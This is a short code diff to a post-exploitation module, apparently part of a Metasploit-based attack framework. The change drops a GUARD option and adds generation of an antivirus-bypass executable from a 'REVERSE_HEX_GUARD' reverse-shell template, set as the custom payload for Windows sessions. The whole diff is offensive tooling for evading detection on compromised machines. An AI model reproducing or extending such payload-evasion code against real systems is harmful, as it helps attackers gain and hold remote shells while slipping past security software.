@@ -30,8 +30,6 @@ class PostModule(PostMSFRawModule):
 
     def check(self):
         """执行前的检查函数"""
-        # from PostModule.lib.Session import Session
-        self.set_msf_option(key="GUARD", value=True)
         session = Session(self._sessionid)
         if session.is_windows:
             pass
@@ -41,7 +39,8 @@ class PostModule(PostMSFRawModule):
         self.set_payload_by_handler()
         if 'windows' not in self.opts.get('PAYLOAD').lower():
             return False, "选择handler错误,建议选择windows平台的handler"
-
+        exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_GUARD")
+        self.set_msf_option("EXE::Custom", exe_filepath)
         return True, None
 
     def callback(self, status, message, data):
